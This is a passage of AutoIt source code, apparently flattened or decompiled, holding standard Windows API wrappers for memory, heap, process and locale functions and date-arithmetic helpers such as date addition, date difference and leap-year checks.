		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_iswow64process($ipid = 0)
		If NOT $ipid Then $ipid = @AutoItPID
		Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", __iif($__winver < 1536, 1024, 4096), "bool", 0, "dword", $ipid)
		If @error OR NOT $hprocess[0] Then Return SetError(@error + 20, @extended, False)
		Local $aret = DllCall("kernel32.dll", "bool", "IsWow64Process", "handle", $hprocess[0], "bool*", 0)
		If __checkerrorclosehandle($aret, $hprocess[0]) Then Return SetError(@error, @extended, False)
		Return $aret[2]
	EndFunc

	Func _winapi_movememory($pdestination, $psource, $ilength)
		If _winapi_isbadreadptr($psource, $ilength) Then Return SetError(10, @extended, 0)
		If _winapi_isbadwriteptr($pdestination, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlMoveMemory", "ptr", $pdestination, "ptr", $psource, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_pathisdirectory($spath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsDirectoryW", "wstr", $spath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_strlen($pstring, $bunicode = True)
		Local $w = ""
		If $bunicode Then $w = "W"
		Local $aret = DllCall("kernel32.dll", "int", "lstrlen" & $w, "ptr", $pstring)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_structtoarray(ByRef $tstruct, $iitems = 0)
		Local $isize = 2 * Floor(DllStructGetSize($tstruct) / 2)
		Local $pstruct = DllStructGetPtr($tstruct)
		If NOT $isize OR NOT $pstruct Then Return SetError(1, 0, 0)
		Local $tdata, $ilength, $ioffset = 0
		Local $aresult[101] = [0]
		While 1
			$ilength = _winapi_strlen($pstruct + $ioffset)
			If NOT $ilength Then
				ExitLoop
			EndIf
			If 2 * (1 + $ilength) + $ioffset > $isize Then Return SetError(3, 0, 0)
			$tdata = DllStructCreate("wchar[" & (1 + $ilength) & "]", $pstruct + $ioffset)
			If @error Then Return SetError(@error + 10, 0, 0)
			__inc($aresult)
			$aresult[$aresult[0]] = DllStructGetData($tdata, 1)
			If $aresult[0] = $iitems Then
				ExitLoop
			EndIf
			$ioffset += 2 * (1 + $ilength)
			If $ioffset >= $isize Then Return SetError(3, 0, 0)
		WEnd
		If NOT $aresult[0] Then Return SetError(2, 0, 0)
		__inc($aresult, -1)
		Return $aresult
	EndFunc

	Func _winapi_switchcolor($icolor)
		If $icolor = -1 Then Return $icolor
		Return BitOR(BitAND($icolor, 65280), BitShift(BitAND($icolor, 255), -16), BitShift(BitAND($icolor, 16711680), 16))
	EndFunc

	Func _winapi_zeromemory($pmemory, $ilength)
		If _winapi_isbadwriteptr($pmemory, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlZeroMemory", "ptr", $pmemory, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __checkerrorarraybounds(Const ByRef $adata, ByRef $istart, ByRef $iend, $ndim = 1, $idim = $ubound_dimensions)
		If NOT IsArray($adata) Then Return SetError(1, 0, 1)
		If UBound($adata, $idim) <> $ndim Then Return SetError(2, 0, 1)
		If $istart < 0 Then $istart = 0
		Local $iubound = UBound($adata) - 1
		If $iend < 1 OR $iend > $iubound Then $iend = $iubound
		If $istart > $iend Then Return SetError(4, 0, 1)
		Return 0
	EndFunc

	Func __checkerrorclosehandle($aret, $hfile, $blasterror = 0, $icurerr = @error, $icurext = @extended)
		If NOT $icurerr AND NOT $aret[0] Then $icurerr = 10
		Local $ilasterror = _winapi_getlasterror()
		DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
		If $icurerr Then _winapi_setlasterror($ilasterror)
		If $blasterror Then $icurext = $ilasterror
		Return SetError($icurerr, $icurext, $icurerr)
	EndFunc

	Func __dll($spath, $bpin = False)
		Local $aret = DllCall("kernel32.dll", "bool", "GetModuleHandleExW", "dword", __iif($bpin, 1, 2), "wstr", $spath, "ptr*", 0)
		If NOT $aret[3] Then
			Local $aresult = DllCall("kernel32.dll", "handle", "LoadLibraryW", "wstr", $spath)
			If NOT $aresult[0] Then Return 0
		EndIf
		Return 1
	EndFunc

	Func __enumwindowsproc($hwnd, $bvisible)
		Local $aresult
		If $bvisible Then
			$aresult = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
			If NOT $aresult[0] Then
				Return 1
			EndIf
		EndIf
		__inc($__g_venum)
		$__g_venum[$__g_venum[0][0]][0] = $hwnd
		$aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
		$__g_venum[$__g_venum[0][0]][1] = $aresult[2]
		Return 1
	EndFunc

	Func __fatalexit($icode, $stext = "")
		If $stext Then MsgBox($mb_systemmodal, "AutoIt", $stext)
		_winapi_fatalexit($icode)
	EndFunc

	Func __heapalloc($isize, $babort = False)
		Local $aret
		If NOT $__g_hheap Then
			$aret = DllCall("kernel32.dll", "handle", "HeapCreate", "dword", 0, "ulong_ptr", 0, "ulong_ptr", 0)
			If @error OR NOT $aret[0] Then __fatalexit(1, "Error allocating memory.")
			$__g_hheap = $aret[0]
		EndIf
		$aret = DllCall("kernel32.dll", "ptr", "HeapAlloc", "handle", $__g_hheap, "dword", 8, "ulong_ptr", $isize)
		If @error OR NOT $aret[0] Then
			If $babort Then __fatalexit(1, "Error allocating memory.")
			Return SetError(@error + 30, @extended, 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func __heapfree(ByRef $pmemory, $bcheck = False, $icurerr = @error, $icurext = @extended)
		If $bcheck AND (NOT __heapvalidate($pmemory)) Then Return SetError(@error, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "int", "HeapFree", "ptr", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error OR NOT $aret[0] Then Return SetError(@error + 40, @extended, 0)
		$pmemory = 0
		Return SetError($icurerr, $icurext, 1)
	EndFunc

	Func __heaprealloc($pmemory, $isize, $bamount = False, $babort = False)
		Local $aret, $pret
		If __heapvalidate($pmemory) Then
			If $bamount AND (__heapsize($pmemory) >= $isize) Then Return SetExtended(1, Ptr($pmemory))
			$aret = DllCall("kernel32.dll", "ptr", "HeapReAlloc", "handle", $__g_hheap, "dword", 8, "ptr", $pmemory, "ulong_ptr", $isize)
			If @error OR NOT $aret[0] Then
				If $babort Then __fatalexit(1, "Error allocating memory.")
				Return SetError(@error + 20, @extended, Ptr($pmemory))
			EndIf
			$pret = $aret[0]
		Else
			$pret = __heapalloc($isize, $babort)
			If @error Then Return SetError(@error, @extended, 0)
		EndIf
		Return $pret
	EndFunc

	Func __heapsize($pmemory, $bcheck = False)
		If $bcheck AND (NOT __heapvalidate($pmemory)) Then Return SetError(@error, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "ulong_ptr", "HeapSize", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error OR ($aret[0] = Ptr(-1)) Then Return SetError(@error + 50, @extended, 0)
		Return $aret[0]
	EndFunc

	Func __heapvalidate($pmemory)
		If (NOT $__g_hheap) OR (NOT Ptr($pmemory)) Then Return SetError(9, 0, False)
		Local $aret = DllCall("kernel32.dll", "int", "HeapValidate", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func __inc(ByRef $adata, $iincrement = 100)
		Select 
			Case UBound($adata, $ubound_columns)
				If $iincrement < 0 Then
					ReDim $adata[$adata[0][0] + 1][UBound($adata, $ubound_columns)]
				Else
					$adata[0][0] += 1
					If $adata[0][0] > UBound($adata) - 1 Then
						ReDim $adata[$adata[0][0] + $iincrement][UBound($adata, $ubound_columns)]
					EndIf
				EndIf
			Case UBound($adata, $ubound_rows)
				If $iincrement < 0 Then
					ReDim $adata[$adata[0] + 1]
				Else
					$adata[0] += 1
					If $adata[0] > UBound($adata) - 1 Then
						ReDim $adata[$adata[0] + $iincrement]
					EndIf
				EndIf
			Case Else
				Return 0
		EndSelect
		Return 1
	EndFunc

	Func __iif($btest, $vtrue, $vfalse)
		Return $btest ? $vtrue : $vfalse
	EndFunc

	Func __init($ddata)
		Local $ilength = BinaryLen($ddata)
		Local $aret = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong_ptr", $ilength, "dword", 4096, "dword", 64)
		If @error OR NOT $aret[0] Then __fatalexit(1, "Error allocating memory.")
		Local $tdata = DllStructCreate("byte[" & $ilength & "]", $aret[0])
		DllStructSetData($tdata, 1, $ddata)
		Return $aret[0]
	EndFunc

	Func __rgb($icolor)
		If $__g_irgbmode Then
			$icolor = _winapi_switchcolor($icolor)
		EndIf
		Return $icolor
	EndFunc

	Func __winver()
		Local $tosvi = DllStructCreate($tagosversioninfo)
		DllStructSetData($tosvi, 1, DllStructGetSize($tosvi))
		Local $aret = DllCall("kernel32.dll", "bool", "GetVersionExW", "struct*", $tosvi)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return BitOR(BitShift(DllStructGetData($tosvi, 2), -8), DllStructGetData($tosvi, 3))
	EndFunc

#EndRegion Internal Functions
#Region Global Variables and Constants
	Global Const $tagnumberfmt = "uint NumDigits;uint LeadingZero;uint Grouping;ptr DecimalSep;ptr ThousandSep;uint NegativeOrder"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_comparestring($ilcid, $sstring1, $sstring2, $iflags = 0)
		Local $aret = DllCall("kernel32.dll", "int", "CompareStringW", "dword", $ilcid, "dword", $iflags, "wstr", $sstring1, "int", -1, "wstr", $sstring2, "int", -1)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createnumberformatinfo($inumdigits, $ileadingzero, $igrouping, $sdecimalsep, $sthousandsep, $inegativeorder)
		Local $tfmt = DllStructCreate($tagnumberfmt & ";wchar[" & (StringLen($sdecimalsep) + 1) & "];wchar[" & (StringLen($sthousandsep) + 1) & "]")
		DllStructSetData($tfmt, 1, $inumdigits)
		DllStructSetData($tfmt, 2, $ileadingzero)
		DllStructSetData($tfmt, 3, $igrouping)
		DllStructSetData($tfmt, 4, DllStructGetPtr($tfmt, 7))
		DllStructSetData($tfmt, 5, DllStructGetPtr($tfmt, 8))
		DllStructSetData($tfmt, 6, $inegativeorder)
		DllStructSetData($tfmt, 7, $sdecimalsep)
		DllStructSetData($tfmt, 8, $sthousandsep)
		Return $tfmt
	EndFunc

	Func _winapi_enumsystemgeoid()
		Local $henumproc = DllCallbackRegister("__EnumGeoIDProc", "bool", "long")
		Dim $__g_venum[101] = [0]
		Local $aret = DllCall("kernel32.dll", "bool", "EnumSystemGeoID", "dword", 16, "long", 0, "ptr", DllCallbackGetPtr($henumproc))
		If @error OR NOT $aret[0] OR NOT $__g_venum[0] Then
			$__g_venum = @error + 10
		EndIf
		DllCallbackFree($henumproc)
		If $__g_venum Then Return SetError($__g_venum, 0, 0)
		__inc($__g_venum, -1)
		Return $__g_venum
	EndFunc

	Func _winapi_enumsystemlocales($iflag)
		Local $henumproc = DllCallbackRegister("__EnumLocalesProc", "bool", "ptr")
		Dim $__g_venum[101] = [0]
		Local $aret = DllCall("kernel32.dll", "bool", "EnumSystemLocalesW", "ptr", DllCallbackGetPtr($henumproc), "dword", $iflag)
		If @error OR NOT $aret[0] OR NOT $__g_venum[0] Then
			$__g_venum = @error + 10
		EndIf
		DllCallbackFree($henumproc)
		If $__g_venum Then Return SetError($__g_venum, 0, 0)
		__inc($__g_venum, -1)
		Return $__g_venum
	EndFunc

	Func _winapi_enumuilanguages($iflag = 0)
		Local $henumproc = DllCallbackRegister("__EnumUILanguagesProc", "bool", "ptr;long_ptr")
		Local $iid = 1
		If $__winver >= 1536 Then
			If BitAND($iflag, 8) Then
				$iid = 0
			EndIf
		Else
			$iflag = 0
		EndIf
		Dim $__g_venum[101] = [0]
		Local $aret = DllCall("kernel32.dll", "bool", "EnumUILanguagesW", "ptr", DllCallbackGetPtr($henumproc), "dword", $iflag, "long_ptr", $iid)
		If @error OR NOT $aret[0] OR NOT $__g_venum[0] Then
			$__g_venum = @error + 10
		EndIf
		DllCallbackFree($henumproc)
		If $__g_venum Then Return SetError($__g_venum, 0, 0)
		__inc($__g_venum, -1)
		Return $__g_venum
	EndFunc

	Func _winapi_getdateformat($ilcid = 0, $tsystemtime = 0, $iflags = 0, $sformat = "")
		If NOT $ilcid Then $ilcid = 1024
		Local $stypeofformat = "wstr"
		If NOT StringStripWS($sformat, $str_stripleading + $str_striptrailing) Then
			$stypeofformat = "ptr"
			$sformat = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "int", "GetDateFormatW", "dword", $ilcid, "dword", $iflags, "struct*", $tsystemtime, $stypeofformat, $sformat, "wstr", "", "int", 2048)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[5]
	EndFunc

	Func _winapi_getdurationformat($ilcid, $iduration, $sformat = "")
		If NOT $ilcid Then $ilcid = 1024
		Local $pst, $ival
		If IsDllStruct($iduration) Then
			$pst = DllStructGetPtr($iduration)
			$ival = 0
		Else
			$pst = 0
			$ival = $iduration
		EndIf
		Local $stypeofformat = "wstr"
		If NOT StringStripWS($sformat, $str_stripleading + $str_striptrailing) Then
			$stypeofformat = "ptr"
			$sformat = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "int", "GetDurationFormat", "dword", $ilcid, "dword", 0, "ptr", $pst, "uint64", $ival, $stypeofformat, $sformat, "wstr", "", "int", 2048)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[6]
	EndFunc

	Func _winapi_getgeoinfo($igeoid, $itype, $ilanguage = 0)
		Local $aret = DllCall("kernel32.dll", "int", "GetGeoInfoW", "long", $igeoid, "dword", $itype, "wstr", "", "int", 4096, "word", $ilanguage)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return $aret[3]
	EndFunc

	Func _winapi_getlocaleinfo($ilcid, $itype)
		Local $aret = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", $ilcid, "dword", $itype, "wstr", "", "int", 2048)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[3]
	EndFunc

	Func _winapi_getnumberformat($ilcid, $snumber, $tnumberfmt = 0)
		If NOT $ilcid Then $ilcid = 1024
		Local $aret = DllCall("kernel32.dll", "int", "GetNumberFormatW", "dword", $ilcid, "dword", 0, "wstr", $snumber, "struct*", $tnumberfmt, "wstr", "", "int", 2048)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
		Return $aret[5]
	EndFunc

	Func _winapi_getsystemdefaultlangid()
		Local $aret = DllCall("kernel32.dll", "word", "GetSystemDefaultLangID")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getsystemdefaultlcid()
		Local $aret = DllCall("kernel32.dll", "dword", "GetSystemDefaultLCID")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getsystemdefaultuilanguage()
		Local $aret = DllCall("kernel32.dll", "word", "GetSystemDefaultUILanguage")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getthreadlocale()
		Local $aret = DllCall("kernel32.dll", "dword", "GetThreadLocale")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getthreaduilanguage()
		Local $aret = DllCall("kernel32.dll", "word", "GetThreadUILanguage")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_gettimeformat($ilcid = 0, $tsystemtime = 0, $iflags = 0, $sformat = "")
		If NOT $ilcid Then $ilcid = 1024
		Local $stypeofformat = "wstr"
		If NOT StringStripWS($sformat, $str_stripleading + $str_striptrailing) Then
			$stypeofformat = "ptr"
			$sformat = 0
		EndIf
		Local $aret = DllCall("kernel32.dll", "int", "GetTimeFormatW", "dword", $ilcid, "dword", $iflags, "struct*", $tsystemtime, $stypeofformat, $sformat, "wstr", "", "int", 2048)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[5]
	EndFunc

	Func _winapi_getuserdefaultlangid()
		Local $aret = DllCall("kernel32.dll", "word", "GetUserDefaultLangID")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getuserdefaultlcid()
		Local $aret = DllCall("kernel32.dll", "dword", "GetUserDefaultLCID")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getuserdefaultuilanguage()
		Local $aret = DllCall("kernel32.dll", "word", "GetUserDefaultUILanguage")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getusergeoid()
		Local $aret = DllCall("kernel32.dll", "long", "GetUserGeoID", "uint", 16)
		If @error Then Return SetError(@error, @extended, -1)
		Return $aret[0]
	EndFunc

	Func _winapi_isvalidlocale($ilcid, $iflag)
		Local $aret = DllCall("kernel32.dll", "bool", "IsValidLocale", "dword", $ilcid, "dword", $iflag)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setlocaleinfo($ilcid, $itype, $sdata)
		Local $aret = DllCall("kernel32.dll", "bool", "SetLocaleInfoW", "dword", $ilcid, "dword", $itype, "wstr", $sdata)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setthreadlocale($ilcid)
		Local $aret = DllCall("kernel32.dll", "bool", "SetThreadLocale", "dword", $ilcid)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setthreaduilanguage($ilanguage)
		Local $aret = DllCall("kernel32.dll", "word", "SetThreadUILanguage", "word", $ilanguage)
		If @error Then Return SetError(@error, @extended, False)
		Return ($aret[0] = $aret[1])
	EndFunc

	Func _winapi_setusergeoid($igeoid)
		Local $aret = DllCall("kernel32.dll", "bool", "SetUserGeoID", "long", $igeoid)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __enumgeoidproc($iid)
		__inc($__g_venum)
		$__g_venum[$__g_venum[0]] = $iid
		Return 1
	EndFunc

	Func __enumlocalesproc($plocale)
		__inc($__g_venum)
		$__g_venum[$__g_venum[0]] = Dec(DllStructGetData(DllStructCreate("wchar[" & (_winapi_strlen($plocale) + 1) & "]", $plocale), 1))
		Return 1
	EndFunc

	Func __enumuilanguagesproc($planguage, $iid)
		__inc($__g_venum)
		$__g_venum[$__g_venum[0]] = DllStructGetData(DllStructCreate("wchar[" & (_winapi_strlen($planguage) + 1) & "]", $planguage), 1)
		If $iid Then
			$__g_venum[$__g_venum[0]] = Dec($__g_venum[$__g_venum[0]])
		EndIf
		Return 1
	EndFunc

#EndRegion Internal Functions

Func _dateadd($stype, $ivaltoadd, $sdate)
	Local $astimepart[4]
	Local $asdatepart[4]
	Local $ijuliandate
	$stype = StringLeft($stype, 1)
	If StringInStr("D,M,Y,w,h,n,s", $stype) = 0 OR $stype = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If NOT StringIsInt($ivaltoadd) Then
		Return SetError(2, 0, 0)
	EndIf
	If NOT _dateisvalid($sdate) Then
		Return SetError(3, 0, 0)
	EndIf
	_datetimesplit($sdate, $asdatepart, $astimepart)
	If $stype = "d" OR $stype = "w" Then
		If $stype = "w" Then $ivaltoadd = $ivaltoadd * 7
		$ijuliandate = _datetodayvalue($asdatepart[1], $asdatepart[2], $asdatepart[3]) + $ivaltoadd
		_dayvaluetodate($ijuliandate, $asdatepart[1], $asdatepart[2], $asdatepart[3])
	EndIf
	If $stype = "m" Then
		$asdatepart[2] = $asdatepart[2] + $ivaltoadd
		While $asdatepart[2] > 12
			$asdatepart[2] = $asdatepart[2] - 12
			$asdatepart[1] = $asdatepart[1] + 1
		WEnd
		While $asdatepart[2] < 1
			$asdatepart[2] = $asdatepart[2] + 12
			$asdatepart[1] = $asdatepart[1] - 1
		WEnd
	EndIf
	If $stype = "y" Then
		$asdatepart[1] = $asdatepart[1] + $ivaltoadd
	EndIf
	If $stype = "h" OR $stype = "n" OR $stype = "s" Then
		Local $itimeval = _timetoticks($astimepart[1], $astimepart[2], $astimepart[3]) / 1000
		If $stype = "h" Then $itimeval = $itimeval + $ivaltoadd * 3600
		If $stype = "n" Then $itimeval = $itimeval + $ivaltoadd * 60
		If $stype = "s" Then $itimeval = $itimeval + $ivaltoadd
		Local $iday2add = Int($itimeval / (24 * 60 * 60))
		$itimeval = $itimeval - $iday2add * 24 * 60 * 60
		If $itimeval < 0 Then
			$iday2add = $iday2add - 1
			$itimeval = $itimeval + 24 * 60 * 60
		EndIf
		$ijuliandate = _datetodayvalue($asdatepart[1], $asdatepart[2], $asdatepart[3]) + $iday2add
		_dayvaluetodate($ijuliandate, $asdatepart[1], $asdatepart[2], $asdatepart[3])
		_tickstotime($itimeval * 1000, $astimepart[1], $astimepart[2], $astimepart[3])
	EndIf
	Local $inumdays = _daysinmonth($asdatepart[1])
	If $inumdays[$asdatepart[2]] < $asdatepart[3] Then $asdatepart[3] = $inumdays[$asdatepart[2]]
	$sdate = $asdatepart[1] & "/" & StringRight("0" & $asdatepart[2], 2) & "/" & StringRight("0" & $asdatepart[3], 2)
	If $astimepart[0] > 0 Then
		If $astimepart[0] > 2 Then
			$sdate = $sdate & " " & StringRight("0" & $astimepart[1], 2) & ":" & StringRight("0" & $astimepart[2], 2) & ":" & StringRight("0" & $astimepart[3], 2)
		Else
			$sdate = $sdate & " " & StringRight("0" & $astimepart[1], 2) & ":" & StringRight("0" & $astimepart[2], 2)
		EndIf
	EndIf
	Return $sdate
EndFunc

Func _datedayofweek($idaynum, $iformat = Default)
	Local Const $monday_is_no1 = 128
	If $iformat = Default Then $iformat = 0
	$idaynum = Int($idaynum)
	If $idaynum < 1 OR $idaynum > 7 Then Return SetError(1, 0, "")
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllStructSetData($tsystemtime, "Year", BitAND($iformat, $monday_is_no1) ? 2007 : 2006)
	DllStructSetData($tsystemtime, "Month", 1)
	DllStructSetData($tsystemtime, "Day", $idaynum)
	Return _winapi_getdateformat(BitAND($iformat, $dmw_locale_longname) ? $locale_user_default : $locale_invariant, $tsystemtime, 0, BitAND($iformat, $dmw_shortname) ? "ddd" : "dddd")
EndFunc

Func _datedaysinmonth($iyear, $imonthnum)
	If __dateismonth($imonthnum) AND __dateisyear($iyear) Then
		Local $anumdays = _daysinmonth($iyear)
		Return $anumdays[$imonthnum]
	EndIf
	Return SetError(1, 0, 0)
EndFunc

Func _datediff($stype, $sstartdate, $senddate)
	$stype = StringLeft($stype, 1)
	If StringInStr("d,m,y,w,h,n,s", $stype) = 0 OR $stype = "" Then
		Return SetError(1, 0, 0)
	EndIf
	If NOT _dateisvalid($sstartdate) Then
		Return SetError(2, 0, 0)
	EndIf
	If NOT _dateisvalid($senddate) Then
		Return SetError(3, 0, 0)
	EndIf
	Local $asstartdatepart[4], $asstarttimepart[4], $asenddatepart[4], $asendtimepart[4]
	_datetimesplit($sstartdate, $asstartdatepart, $asstarttimepart)
	_datetimesplit($senddate, $asenddatepart, $asendtimepart)
	Local $adaysdiff = _datetodayvalue($asenddatepart[1], $asenddatepart[2], $asenddatepart[3]) - _datetodayvalue($asstartdatepart[1], $asstartdatepart[2], $asstartdatepart[3])
	Local $itimediff, $iyeardiff, $istarttimeinsecs, $iendtimeinsecs
	If $asstarttimepart[0] > 1 AND $asendtimepart[0] > 1 Then
		$istarttimeinsecs = $asstarttimepart[1] * 3600 + $asstarttimepart[2] * 60 + $asstarttimepart[3]
		$iendtimeinsecs = $asendtimepart[1] * 3600 + $asendtimepart[2] * 60 + $asendtimepart[3]
		$itimediff = $iendtimeinsecs - $istarttimeinsecs
		If $itimediff < 0 Then
			$adaysdiff = $adaysdiff - 1
			$itimediff = $itimediff + 24 * 60 * 60
		EndIf
	Else
		$itimediff = 0
	EndIf
	Select 
		Case $stype = "d"
			Return $adaysdiff
		Case $stype = "m"
			$iyeardiff = $asenddatepart[1] - $asstartdatepart[1]
			Local $imonthdiff = $asenddatepart[2] - $asstartdatepart[2] + $iyeardiff * 12
			If $asenddatepart[3] < $asstartdatepart[3] Then $imonthdiff = $imonthdiff - 1
			$istarttimeinsecs = $asstarttimepart[1] * 3600 + $asstarttimepart[2] * 60 + $asstarttimepart[3]
			$iendtimeinsecs = $asendtimepart[1] * 3600 + $asendtimepart[2] * 60 + $asendtimepart[3]
			$itimediff = $iendtimeinsecs - $istarttimeinsecs
			If $asenddatepart[3] = $asstartdatepart[3] AND $itimediff < 0 Then $imonthdiff = $imonthdiff - 1
			Return $imonthdiff
		Case $stype = "y"
			$iyeardiff = $asenddatepart[1] - $asstartdatepart[1]
			If $asenddatepart[2] < $asstartdatepart[2] Then $iyeardiff = $iyeardiff - 1
			If $asenddatepart[2] = $asstartdatepart[2] AND $asenddatepart[3] < $asstartdatepart[3] Then $iyeardiff = $iyeardiff - 1
			$istarttimeinsecs = $asstarttimepart[1] * 3600 + $asstarttimepart[2] * 60 + $asstarttimepart[3]
			$iendtimeinsecs = $asendtimepart[1] * 3600 + $asendtimepart[2] * 60 + $asendtimepart[3]
			$itimediff = $iendtimeinsecs - $istarttimeinsecs
			If $asenddatepart[2] = $asstartdatepart[2] AND $asenddatepart[3] = $asstartdatepart[3] AND $itimediff < 0 Then $iyeardiff = $iyeardiff - 1
			Return $iyeardiff
		Case $stype = "w"
			Return Int($adaysdiff / 7)
		Case $stype = "h"
			Return $adaysdiff * 24 + Int($itimediff / 3600)
		Case $stype = "n"
			Return $adaysdiff * 24 * 60 + Int($itimediff / 60)
		Case $stype = "s"
			Return $adaysdiff * 24 * 60 * 60 + $itimediff
	EndSelect
EndFunc

Func _dateisleapyear($iyear)
	If StringIsInt($iyear) Then
		Select 
			Case Mod($iyear, 4) = 0 AND Mod($iyear, 100) <> 0
				Return 1
			Case Mod($iyear, 400) = 0
				Return 1
			Case Else
				Return 0
		EndSelect
	EndIf
	Return SetError(1, 0, 0)
EndFunc

Func __dateismonth($inumber)
	$inumber = Int($inumber)
	Return $inumber >= 1 AND $inumber <= 12
EndFunc

Func _dateisvalid($sdate)
	Local $asdatepart[4], $astimepart[4]
	_datetimesplit($sdate, $asdatepart, $astimepart)
	If NOT StringIsInt($asdatepart[1]) Then Return 0
	If NOT StringIsInt($asdatepart[2]) Then Return 0
	If NOT StringIsInt($asdatepart[3]) Then Return 0
	$asdatepart[1] = Int($asdatepart[1])
	$asdatepart[2] = Int($asdatepart[2])
	$asdatepart[3] = Int($asdatepart[3])
	Local $inumdays = _daysinmonth($asdatepart[1])
	If $asdatepart[1] < 1000 OR $asdatepart[1] > 2999 Then Return 0
	If $asdatepart[2] < 1 OR $asdatepart[2] > 12 Then Return 0
	If $asdatepart[3] < 1 OR $asdatepart[3] > $inumdays[$asdatepart[2]] Then Return 0
	If $astimepart[0] < 1 Then Return 1
	If $astimepart[0] < 2 Then Return 0
	If $astimepart[0] = 2 Then $astimepart[3] = "00"
	If NOT StringIsInt($astimepart[1]) Then Return 0
	If NOT StringIsInt($astimepart[2]) Then Return 0
	If NOT StringIsInt($astimepart[3]) Then Return 0
	$astimepart[1] = Int($astimepart[1])
	$astimepart[2] = Int($astimepart[2])
	$astimepart[3] = Int($astimepart[3])
	If $astimepart[1] < 0 OR $astimepart[1] > 23 Then Return 0
	If $astimepart[2] < 0 OR $astimepart[2] > 59 Then Return 0
	If $astimepart[3] < 0 OR $astimepart[3] > 59 Then Return 0
	Return 1
EndFunc

Func __dateisyear($inumber)
	Return StringLen(Int($inumber)) = 4
EndFunc

Func _datelastweekdaynum($iweekdaynum)
	Select 
		Case NOT StringIsInt($iweekdaynum)
			Return SetError(1, 0, 0)
		Case $iweekdaynum < 1 OR $iweekdaynum > 7
			Return SetError(2, 0, 0)
		Case Else
			Local $ilastweekdaynum
			If $iweekdaynum = 1 Then
				$ilastweekdaynum = 7
			Else
				$ilastweekdaynum = $iweekdaynum - 1
			EndIf
			Return $ilastweekdaynum
	EndSelect
EndFunc

Func _datelastmonthnum($imonthnum)
	Select 
		Case NOT StringIsInt($imonthnum)
			Return SetError(1, 0, 0)
		Case NOT __dateismonth($imonthnum)
			Return SetError(2, 0, 0)
		Case Else
			Local $ilastmonthnum
			If $imonthnum = 1 Then
				$ilastmonthnum = 12
			Else
				$ilastmonthnum = $imonthnum - 1
			EndIf
			$ilastmonthnum = StringFormat("%02d", $ilastmonthnum)
			Return $ilastmonthnum
	EndSelect
EndFunc

Func _datelastmonthyear($imonthnum, $iyear)
	Select 
		Case NOT StringIsInt($imonthnum) OR NOT StringIsInt($iyear)
			Return SetError(1, 0, 0)
		Case NOT __dateismonth($imonthnum)
			Return SetError(2, 0, 0)
		Case Else
			Local $ilastyear
			If $imonthnum = 1 Then
				$ilastyear = $iyear - 1
			Else
				$ilastyear = $iyear
			EndIf
			$ilastyear = StringFormat("%04d", $ilastyear)
			Return $ilastyear
	EndSelect
EndFunc

Func _datenextweekdaynum($iweekdaynum)
	Select 
		Case NOT StringIsInt($iweekdaynum)
			Return SetError(1, 0, 0)
		Case $iweekdaynum < 1 OR $iweekdaynum > 7
			Return SetError(2, 0, 0)
		Case Else
			Local $inextweekdaynum
			If $iweekdaynum = 7 Then
				$inextweekdaynum = 1
